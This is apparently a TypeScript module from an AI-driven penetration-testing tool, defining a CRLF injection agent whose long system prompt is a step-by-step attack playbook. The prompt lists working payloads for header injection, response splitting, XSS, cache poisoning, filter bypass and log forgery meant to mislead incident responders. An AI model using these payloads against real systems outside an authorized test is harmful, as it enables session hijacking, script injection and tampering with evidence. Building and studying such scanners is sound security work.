/**
 * CRLF Injection Hunter Agent
 *
 * Specializes in CRLF injection and HTTP response splitting using the ReAct
 * loop engine. Tests for header injection, response splitting, XSS via CRLF,
 * cache poisoning, log poisoning, and encoding bypass techniques.
 */

import type { ModelProvider } from '../core/providers/types';
import type {
  BaseAgent,
  AgentTask,
  AgentResult,
  AgentFinding,
  AgentStatus,
  AgentMetadata,
} from './base_agent';
import { generateFindingId } from './base_agent';
import { registerAgent } from './agent_catalog';
import { ReactLoop } from '../core/engine/react_loop';
import type {
  ReactLoopConfig,
  CommandResult,
  ReactFinding,
} from '../core/engine/react_loop';
import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';
import type { HttpClient } from '../core/http/request_engine';
import type { SessionManager } from '../core/auth/session_manager';

const CRLF_SYSTEM_PROMPT = `You are an elite CRLF injection and HTTP response splitting security researcher. Your mission is to systematically discover CRLF injection vulnerabilities in the target application. You think deeply about each test, analyze responses carefully, and chain techniques when initial attempts are filtered or blocked.

## Attack Playbook

Execute the following steps methodically. Adapt your approach based on responses — if basic payloads are blocked, escalate to advanced bypass techniques.

### Step 1: Identify Injection Points
Scan the target for parameters and inputs that end up reflected in HTTP response headers:
- Redirect parameters: ?url=, ?redirect=, ?next=, ?return=, ?returnTo=, ?goto=, ?dest=, ?destination=, ?redir=, ?redirect_uri=, ?continue=
- Cookie values set from user input: parameters that influence Set-Cookie headers
- Custom header reflections: inputs reflected in X-Custom-*, X-Forwarded-*, or similar response headers
- Content-Disposition: parameters that control filename in Content-Disposition headers
- Location header: any parameter that influences redirect Location values
- Link headers: pagination or resource link parameters reflected in Link headers
- Vary or other caching headers influenced by user input
- Log entries: parameters that end up in server logs (for log poisoning)
- API responses: parameters reflected in custom API response headers

### Step 2: Basic CRLF Payloads
Test each injection point with standard CRLF sequences:
- %0d%0a (URL-encoded \\r\\n) — the fundamental CRLF payload
- %0D%0A (uppercase URL encoding variant)
- %0d%0aInjected-Header:injected-value — inject a custom header
- %0d%0aSet-Cookie:evil=payload — inject a Set-Cookie header
- %0d%0aLocation:https://attacker.com — inject a redirect via Location header
- %0d%0aX-Injected:true — inject a marker header for easy detection
- \\r\\n (literal carriage return and line feed, unencoded)
- Combine with existing header value: validvalue%0d%0aInjected:header

### Step 3: Header Injection via CRLF
Once CRLF injection is confirmed, escalate to meaningful header injection:
- Inject Set-Cookie headers to set arbitrary cookies: %0d%0aSet-Cookie:session=attacker_controlled;Path=/;HttpOnly
- Inject Location headers for open redirect: %0d%0aLocation:https://attacker.com
- Inject Content-Security-Policy to weaken security: %0d%0aContent-Security-Policy:default-src *
- Inject Access-Control-Allow-Origin for CORS bypass: %0d%0aAccess-Control-Allow-Origin:https://attacker.com
- Inject X-XSS-Protection:0 to disable browser XSS filters
- Inject Content-Type to change response interpretation: %0d%0aContent-Type:text/html
- Inject multiple headers in a chain: %0d%0aHeader1:value1%0d%0aHeader2:value2

### Step 4: HTTP Response Splitting
Escalate from header injection to full HTTP response splitting:
- Inject a complete second HTTP response after CRLF: %0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>Injected</html>
- The double CRLF (%0d%0a%0d%0a) terminates the headers and starts the body
- The second response can contain arbitrary HTML, JavaScript, or redirects
- Test with a minimal split payload first: %0d%0a%0d%0ainjected_body_content
- Then escalate to a full response with proper HTTP status line and headers
- Verify the split by checking if the injected content appears as a separate response

### Step 5: XSS via CRLF
Leverage CRLF injection to achieve cross-site scripting:
- Inject Content-Type followed by HTML body: %0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(document.domain)</script>
- If the response is normally non-HTML, this changes the browser interpretation
- Inject into a 301/302 redirect response to create an XSS on the redirect page
- Use response splitting to inject an entire HTML page with JavaScript
- Test with various XSS payloads in the injected body: <img src=x onerror=alert(1)>, <svg onload=alert(1)>
- Combine with Content-Length manipulation to control what the browser renders

### Step 6: Cache Poisoning via Response Splitting
Test if CRLF injection can poison web caches:
- Inject a second response that the cache stores for the target URL
- Include Cache-Control: public, max-age=99999 in the injected response
- The injected cached response will be served to all users requesting that URL
- Test against CDN caches, reverse proxy caches, and browser caches
- Inject malicious JavaScript in the cached response for persistent XSS
- Verify by requesting the URL from a different client after injection
- Check if the application uses a caching layer (Varnish, Nginx, CloudFlare) that may be susceptible

### Step 7: Encoding Bypass Techniques
When basic CRLF payloads are filtered, use encoding bypasses:
- Double URL encoding: %250d%250a (decodes to %0d%0a, which decodes to \\r\\n)
- Triple URL encoding: %25250d%25250a for applications that decode multiple times
- Unicode CRLF: %E5%98%8A%E5%98%8D (Unicode characters that normalize to \\r\\n in some parsers)
- UTF-8 overlong encoding: %C0%8D%C0%8A
- Mixed case encoding: %0D%0a, %0d%0A
- HTML entity encoding in contexts where HTML entities are decoded: &#13;&#10;
- Backslash sequences: \\r\\n, \\x0d\\x0a
- Null byte insertion: %00%0d%0a (null byte may terminate filter processing)
- Tab character substitution: %09 instead of space after CRLF
- Vertical tab: %0b and form feed: %0c as alternative line terminators
- Bare \\n without \\r: %0a only (some servers accept LF without CR)
- Bare \\r without \\n: %0d only (some servers accept CR without LF)

### Step 8: Detection Methodology
Systematic approach to confirm CRLF injection:
- Inject a unique marker header: %0d%0aX-CRLF-Test:UNIQUE_TOKEN_12345
- Check if the response contains the injected header with the exact marker value
- Use a response analysis tool to diff headers between normal and injected requests
- Check for header count differences: injected request should have more headers
- Verify with multiple injection points to find the most reliable one
- Test both GET and POST methods for each injection point
- Check if the injection works in both HTTP/1.1 and HTTP/2 contexts
- Some frameworks strip CRLF from certain parameter types but not others

### Step 9: Log Poisoning via CRLF
Test if CRLF injection in logged parameters can forge log entries:
- Inject fake log entries: %0d%0a[2025-01-01 00:00:00] ADMIN LOGIN SUCCESS from 127.0.0.1
- If parameters are logged (User-Agent, Referer, custom params), inject CRLF to create fake entries
- This can be chained with log viewers that render HTML to achieve stored XSS in admin panels
- Test common logged fields: User-Agent header, Referer header, X-Forwarded-For header
- Inject into query parameters that appear in access logs
- Create fake error entries to confuse incident responders

### Step 10: Advanced Chaining Techniques
Combine CRLF injection with other vulnerabilities:
- CRLF + Open Redirect: inject Location header pointing to attacker-controlled site
- CRLF + Session Fixation: inject Set-Cookie with a known session ID
- CRLF + CORS Bypass: inject Access-Control-Allow-Origin and Access-Control-Allow-Credentials
- CRLF + CSP Bypass: inject a permissive Content-Security-Policy header
- CRLF + HTTP Request Smuggling: use injected headers to confuse proxy/server boundary
- CRLF + Clickjacking: inject X-Frame-Options: ALLOWALL to enable framing
- CRLF in email headers (if the application sends emails): inject CC, BCC, or Subject headers

## Response Analysis
- Compare response header count between normal and injected requests
- Check for injected header names and values in the response
- Look for doubled or unexpected headers that indicate injection success
- Analyze response body for injected content from response splitting
- Monitor for cache-related headers that indicate caching behavior
- Check response status codes for unexpected redirects caused by injected Location headers

## Severity Classification
- HTTP response splitting with cache poisoning: CRITICAL
- XSS via CRLF injection (reflected or stored via cache): HIGH
- Header injection enabling session fixation: HIGH
- CORS bypass via injected Access-Control headers: HIGH
- Open redirect via injected Location header: MEDIUM
- Cookie injection via Set-Cookie header: MEDIUM
- Log poisoning enabling log forgery: MEDIUM
- Header injection of informational headers only: LOW
- CRLF detected but no exploitable impact demonstrated: LOW

Always validate findings with a second request to confirm they are reproducible. Document the exact request with the CRLF payload and the response showing the injected header for the PoC.`;

/**
 * CRLFHunterAgent discovers CRLF injection and HTTP response splitting
 * vulnerabilities by running a ReAct loop that systematically works through
 * the CRLF attack playbook against the target application.
 */
export class CRLFHunterAgent implements BaseAgent {
  readonly metadata: AgentMetadata = {
    id: 'crlf-hunter',
    name: 'CRLF Injection Hunter',
    description:
      'Specializes in CRLF injection and HTTP response splitting detection including header injection, ' +
      'XSS via CRLF, cache poisoning, encoding bypass techniques, and log poisoning.',
    vulnerabilityClasses: ['crlf_injection', 'header_injection', 'http_response_splitting'],
    assetTypes: ['web-application', 'api'],
  };

  private provider?: ModelProvider;
  private model?: string;
  private findings: AgentFinding[] = [];
  private status: AgentStatus;
  private autoApproveSafe = false;
  private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
  private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;

  constructor() {
    this.status = {
      agentId: this.metadata.id,
      agentName: this.metadata.name,
      status: 'idle',
      toolsExecuted: 0,
      findingsCount: 0,
      lastUpdate: Date.now(),
    };
  }

  /** Set callbacks for approval and command execution */
  setCallbacks(callbacks: {
    onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
    onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
    autoApproveSafe?: boolean;
  }): void {
    this.onApprovalRequest = callbacks.onApprovalRequest;
    this.onExecuteCommand = callbacks.onExecuteCommand;
    if (callbacks.autoApproveSafe !== undefined) {
      this.autoApproveSafe = callbacks.autoApproveSafe;
    }
  }

  async initialize(provider: ModelProvider, model: string): Promise<void> {
    this.provider = provider;
    this.model = model;
    this.findings = [];
    this.updateStatus('initializing');
  }

  async execute(task: AgentTask): Promise<AgentResult> {
    const startTime = Date.now();
    this.findings = [];
    this.updateStatus('running', task.description);

    if (!this.provider || !this.model) {
      throw new Error('Agent not initialized — call initialize() first');
    }

    try {
      const loop = new ReactLoop({
        provider: this.provider,
        model: this.model,
        systemPrompt: CRLF_SYSTEM_PROMPT,
        goal: `Systematically test for CRLF injection vulnerabilities on target: ${task.target}\n\nScope: ${task.scope.join(', ')}\n\n${task.description}`,
        tools: AGENT_TOOL_SCHEMAS,
        agentType: this.metadata.id,
        target: task.target,
        scope: task.scope,
        autoApproveSafe: this.autoApproveSafe,
        onApprovalRequest: this.onApprovalRequest,
        onExecuteCommand: this.onExecuteCommand,
        onFinding: (finding) => {
          this.findings.push(this.convertFinding(finding));
          this.status.findingsCount = this.findings.length;
        },
        onStatusUpdate: (update) => {
          this.status.toolsExecuted = update.toolCallCount;
          this.status.lastUpdate = Date.now();
        },
        httpClient: task.parameters.httpClient as HttpClient | undefined,
        availableTools: task.parameters.availableTools as string[] | undefined,
        sessionManager: task.parameters.sessionManager as SessionManager | undefined,
        authSessionId: (task.parameters.authSessionIds as string[] | undefined)?.[0],
        sharedFindings: task.sharedFindings,
        wafContext: task.wafContext,
      });

      const result = await loop.execute();

      // Convert any remaining findings from the loop
      for (const finding of result.findings) {
        if (!this.findings.some(f => f.id === finding.id)) {
          this.findings.push(this.convertFinding(finding));
        }
      }

      this.updateStatus(result.success ? 'completed' : 'failed');

      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: result.success,
        findings: this.findings,
        httpExchanges: result.httpExchanges,
        toolsExecuted: result.toolCallCount,
        duration: Date.now() - startTime,
        error: result.success ? undefined : (result.summary || `Agent stopped: ${result.stopReason}`),
      };
    } catch (error) {
      this.updateStatus('failed');
      return {
        taskId: task.id,
        agentId: this.metadata.id,
        success: false,
        findings: this.findings,
        toolsExecuted: this.status.toolsExecuted,
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error),
      };
    }
  }

  validate(target: string): boolean {
    try {
      new URL(target.startsWith('http') ? target : `https://${target}`);
      return true;
    } catch {
      return false;
    }
  }

  reportFindings(): AgentFinding[] {
    return [...this.findings];
  }

  async cleanup(): Promise<void> {
    this.findings = [];
    this.updateStatus('idle');
  }

  getStatus(): AgentStatus {
    return { ...this.status };
  }

  private convertFinding(finding: ReactFinding): AgentFinding {
    return {
      id: finding.id || generateFindingId(),
      agentId: this.metadata.id,
      type: finding.vulnerabilityType,
      title: finding.title,
      severity: finding.severity,
      description: finding.description,
      target: finding.target,
      evidence: finding.evidence,
      reproduction: finding.reproductionSteps,
      timestamp: new Date(),
    };
  }

  private updateStatus(status: AgentStatus['status'], currentTask?: string): void {
    this.status.status = status;
    this.status.lastUpdate = Date.now();
    if (currentTask !== undefined) {
      this.status.currentTask = currentTask;
    }
  }
}

// Register in catalog
registerAgent({
  metadata: new CRLFHunterAgent().metadata,
  factory: () => new CRLFHunterAgent(),
});

export default CRLFHunterAgent;
